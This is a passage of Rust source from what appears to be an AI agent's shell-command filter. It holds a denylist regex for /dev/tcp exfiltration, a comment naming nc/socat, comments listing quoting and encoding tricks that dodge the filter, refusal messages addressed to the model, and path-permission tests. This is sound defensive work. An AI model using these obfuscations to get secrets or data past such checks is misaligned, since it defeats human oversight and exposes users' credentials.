            // no legitimate agent use. (nc/ncat/socat are dual-use and left as a
            // documented follow-up rather than risk false positives.) Anchored to
            // an absolute `/dev/tcp/` (start, or after whitespace / a redirect),
            // so an ordinary relative path component (`./dev/tcp/x`, `src/dev/tcp/`)
            // is not flagged.
            r"(?i)(^|[\s<>&])/dev/(tcp|udp)/",
        ];
        RegexSet::new(patterns).expect("#673 network-exfil denylist regex set must compile")
    })
}

/// tools-exec-14/16: best-effort de-obfuscation of trivial shell quoting
/// tricks before the denylist runs. A model (or prompt-injection payload)
/// can dodge the literal `\benv\b` regex with shell forms that the shell
/// collapses back to `env` at parse time but that the raw regex misses:
/// `e''nv`, `e""nv`, `e\nv`, `"env"`, `'env'`. We strip empty quote pairs,
/// backslash-escapes of ordinary chars, and surrounding quotes from each
/// word so the SAME pattern set sees the post-collapse token.
///
/// This is **defense-in-depth only** — it does NOT make the denylist a
/// security boundary. A determined attacker has unbounded obfuscation
/// (`$(printf '\145nv')`, variable indirection, base64-decode-then-eval,
/// runtime path expansion). The real boundaries are the secret-scrubbed
/// sandbox env and the now-default-Deny network policy; this layer just
/// raises the cost of the cheapest one-liner bypasses.
pub(super) fn deobfuscate(command: &str) -> String {
    let mut out = String::with_capacity(command.len());
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            // Empty quote pair: `''` / `""` — shell collapses to nothing.
            '\'' | '"' if chars.peek() == Some(&c) => {
                chars.next(); // consume the closing quote, emit nothing
            }
            // Lone surrounding quote — drop it so `"env"` -> `env`.
            '\'' | '"' => {}
            // Backslash-escape of an ordinary char (`e\nv` -> `env`). Keep
            // the escaped char only; never the backslash. We do not try to
            // interpret C-style escapes — `\n` here is a literal `n` to the
            // shell outside of `$'...'`, which is the case we are hardening.
            '\\' => {
                if let Some(n) = chars.next() {
                    out.push(n);
                }
            }
            other => out.push(other),
        }
    }
    out
}

/// Returns `Some(reason)` if `command` matches a denylist pattern.
/// `None` means the command is allowed through to the shell.
///
/// `pub` so the integration-test crate (`tests/bash_credential_exfil_test.rs`)
/// can assert the denylist directly without spawning shells.
pub fn check_denylist(command: &str) -> Option<&'static str> {
    const WHOLE: &str = "Refused: command pattern matches credential-exfiltration denylist. \
         If you need an environment variable's value for legitimate reasons, \
         ask the user to provide it directly.";
    const CHAINED: &str = "Refused: chained subcommand matches credential-exfiltration denylist. \
         If you need an environment variable's value for legitimate reasons, \
         ask the user to provide it directly.";
    // #673 — network data-upload exfil (own message; distinct concern).
    const NET_EXFIL: &str = "Refused: this command uploads local data to the network \
         (a file/@-reference, --upload-file/-T, --post-file, or a remote scp/rsync), \
         which is a data-exfiltration vector. Downloads and literal-data requests are \
         fine; to send local data off-box, ask the user to run it or approve the destination.";

    let set = denylist();
    let net = network_exfil_denylist();

    // tools-exec-14/16: test both the raw command and a de-obfuscated form
    // (empty-quote / escape / surrounding-quote stripped) so the cheapest
    // `e''nv` / `"printenv"` dodges collapse back onto the pattern set.
    let deobf = deobfuscate(command);
    let variants = [command, deobf.as_str()];

    // Test each whole-string variant first.
    for v in &variants {
        if set.is_match(v) {
            return Some(WHOLE);
        }
        if net.is_match(v) {
            return Some(NET_EXFIL);
        }
    }

    // Also test each `;`/`&&`/`||`/`|`/newline-separated subcommand (raw and
    // de-obfuscated) so that wrapping `env` inside a chained pipeline doesn't
    // bypass the rule. The split is intentionally simplistic — it would
    // over-match inside quoted strings, which is fine for a denylist (false
    // positives are safe; the user can rephrase).
    for v in &variants {
        for sep in [";", "\n", "&&", "||", "|"] {
            for piece in v.split(sep) {
                if set.is_match(piece) {
                    return Some(CHAINED);
                }
                if net.is_match(piece) {
                    return Some(NET_EXFIL);
                }
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::{is_always_granted, is_path_token, path_exists};

    /// The reassembly oracle must require POSITIVE evidence that a path
    /// exists. Asking "is it definitely absent?" instead looks identical on a
    /// platform where every stat failure is `NotFound`, and is wrong wherever
    /// one is not — which is how a Windows-only regression got past a green
    /// Linux gate.
    ///
    /// A file used as a directory component fails with `NotADirectory` on
    /// Unix and an equivalent non-`NotFound` error on Windows, which is
    /// exactly the shape that slipped through.
    #[test]
    fn the_existence_oracle_requires_a_positive_answer() {
        let file = std::env::current_exe().expect("the test binary exists");
        assert!(path_exists(&file), "positive control: the binary is there");

        assert!(
            !path_exists(&file.join("not-a-directory")),
            "a stat that fails for ANY reason is not a path worth joining on; \
             treating only NotFound as absence accepts this one"
        );

        assert!(
            !path_exists(std::path::Path::new("/definitely/not/here/xyzzy")),
            "and a plainly absent path is still absent"
        );
    }

    /// The verbatim spelling is the one `canonicalize` actually returns on
    /// Windows, and it is a plain string here, so this runs on every host
    /// rather than only on the platform it describes.
    #[test]
    fn every_spelling_of_a_granted_windows_system_path_matches() {
        for path in [
            r"\\?\C:\Windows\System32\kernel32.dll", // what canonicalize returns
            r"C:\Windows\System32\kernel32.dll",     // what cmd / MSVC tools print
            "C:/Windows/System32/kernel32.dll",      // what git / node / python print
            r"\\?\c:\windows\system32\kernel32.dll", // NTFS is case-insensitive
            r"C:\Windows",                           // the prefix itself
        ] {
            assert!(is_always_granted(path), "{path} must be always-granted");
        }
    }

    #[test]
    fn a_normalised_comparison_still_respects_component_boundaries() {
        for path in [
            r"C:\Windowsfoo\x",           // not under `C:\Windows`
            r"D:\Windows\System32\x",     // a different drive
            r"\\?\D:\Windows\System32\x", // …in verbatim form too
            "/w/repo/.git/config",        // an ordinary workspace path
            "usr/bin/foo",                // relative: not the system `/usr`
            // The POSIX twin of the `C:\Windowsfoo` row above. A prefix that
            // compares strings instead of components silently grants these, and
            // a granted path is never reported — so the failure direction is a
            // real denial the user is never told about.
            "/usrfoo/x",
            "/etcetera/passwd",
        ] {
            assert!(
                !is_always_granted(path),
                "{path} must NOT be treated as always-granted"
            );
        }
        assert!(is_always_granted("/usr/bin/foo"));
    }

    #[test]
    fn a_command_line_switch_is_not_a_path_token() {
        for switch in ["/NOLOGO", "/c", "/S", "/t:Build", "/MIR"] {
            assert!(!is_path_token(switch), "{switch} is a switch, not a path");
        }
        for path in [
            "/w/repo/.git/config",
            "./relative/file",
            "src/main.rs",
            "C:/Windows/System32/kernel32.dll",
        ] {
            assert!(is_path_token(path), "{path} is a path");
        }
        // A URL is not a filesystem path.
        assert!(!is_path_token("https://example.com/a/b"));
    }
}
